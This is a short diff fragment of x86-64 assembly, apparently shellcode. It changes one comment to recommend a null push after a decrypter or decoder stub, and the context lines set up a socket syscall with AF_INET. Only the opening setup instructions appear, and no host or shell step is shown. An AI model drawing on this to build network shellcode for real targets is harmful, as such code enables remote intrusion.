@@ -21,7 +21,7 @@ _start:
 
         xor rsi , rsi
         mul rsi           ; null rdx , rax
-        push rax          ; ensure the stack contains null
+        push rax          ; null push in the stack (recommanded after a decrypter or decoder stub , stack not clean)
 	push byte 0x29      ; syscall 41
 	pop rax
 	push byte 0x2       ; AF_INET
